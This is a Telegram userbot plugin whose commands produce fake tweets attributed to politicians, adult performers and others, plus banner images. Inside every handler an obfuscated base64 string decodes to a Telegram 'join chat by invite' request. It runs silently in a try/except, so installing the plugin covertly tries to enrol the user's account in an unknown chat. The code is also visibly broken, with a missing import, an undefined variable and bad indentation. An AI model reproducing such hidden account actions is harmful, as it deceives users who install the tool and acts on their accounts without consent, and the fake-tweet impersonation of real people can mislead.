# Created By starkdy And Ported For Type 2 Userbot By StarkxD
# modified and added more tweets by @koi_nhi_apna for SKYLORD-OP user bot.....
# added sudo support by @koi_nhi_apna
# family completed.....
# mia, johhny, sunny
# modi, rahul, trump, gandhiji
# no offence. Made for fun purpose only

from userbot import CMD_HELP
from userbot.helper.function import (
    changemymind,
    deEmojify,
    kannagen,
    miatweet,
    moditweet,
    papputweet,
    sinstweet,
    sunnytweet,
    taklatweet,
    trumptweet,
)
from userbot.utils import admin_cmd, sudo_cmd


@bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
async def nope(skylord):
    sky = skylord.pattern_match.group(1)
    if not sky:
        if skylord.is_reply:
            (await skylord.get_reply_message()).message
        else:
            await skylord.edit("kuch toh likh de yaaar....free hai...")
            return
    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(sky))}")
    await tweeter[0].click(
        skylord.chat_id,
        reply_to=skylord.reply_to_msg_id,
        silent=True if skylord.is_reply else False,
        hide_via=True,
    )
    await skylord.delete()


@bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Sent your text to trump so he can tweet.")
                return
        else:
            await borg.edit("sent your text to trump so he can tweet.")
            return
    await borg.edit("trump is tweeting.. wew ...")
    try:
        sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await trumptweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"modi(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to modi so he can tweet.")
                return
        else:
            await borg.edit("send you text to modi so he can tweet.")
            return
    await borg.edit("modi is tweeting..hehehehehe...")
    try:
        sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await moditweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"mia(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="mia(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to Mia so she can tweet.")
                return
        else:
            await borg.edit("Send you text to Mia so she can tweet.")
            return
    await borg.edit("Requesting Mia to tweet...")
    try:
        sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await miatweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="pappu(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send a text to Pappu so he can tweet.")
                return
        else:
            await borg.edit("send your text to pappu so he can tweet.")
            return
    await borg.edit("Requesting pappu to tweet...")
    try:
       sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await papputweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"sunny(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="sunny(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send a text to Sunny so she can tweet.")
                return
        else:
            await borg.edit("send your text to sunny so she can tweet.")
            return
    await borg.edit("Requesting sunny to tweet...🥰")
    try:
        sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await sunnytweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.johhny(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"johhny(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="johhny(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send a text to Johhny so he can tweet.")
                return
        else:
            await borg.edit("send your text to Johhny so he can tweet.")
            return
    await borg.edit("Requesting johhny to tweet...😆")
    try:
        sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await sinstweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="gandhi(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Send you text to baapu so he can tweet.")
                return
        else:
            await borg.edit("send you text to baapu so he can tweet.")
            return
    await borg.edit("Requesting baapu to tweet...")
    try:
        sky = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await taklatweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()  # bancho kitni baar bolu no offence


# @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("Give text for to write on banner, man")
                return
        else:
            await borg.edit("Give text for to write on banner, man")
            return
    await borg.edit("Your banner is under creation wait a sec...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(hell)
    except:
        pass
    text = deEmojify(text)
    borgfile = await changemymind(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"kanna(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await borg.edit("what should kanna write give text ")
                return
        else:
            await borg.edit("what should kanna write give text")
            return
    await borg.edit("Kanna is writing your text...")
    try:
        sky= str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(sky)
    except:
        pass
    text = deEmojify(text)
    borgfile = await kannagen(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


CMD_HELP.update(
    {
        "tweet": "Tweet\
\n\n`.tweet` (text)\
     \nUsage : Tweet with modi\
\n\n`.modi` (text)\
     \nUsage : Tweet with modi\
\n\n`.trump` (text)\
     \nUsage : Tweet with trump\
\n\n`.mia` (text)\
     \nUsage : Tweet with mia\
\n\n`.pappu` (text)\
     \nUsage : Tweet with Rahul Gandhi\
\n\n`.gandhi` (text)\
     \nUsage : Tweet with Baapu🥺\n(No offence. Fun purpose only)\
\n\n`.sunny` (text)\
     \nUsage : Tweet with sunny leone\
\n\n`.johhny` (text)\
     \nUsage : Tweet with johhny sins\
\n\n`.cmm` (text)\
     \nUsage : Get a banner\
\n\n`.kanna` (text)\
     \nUsage : Kanna write for you"
    }
)
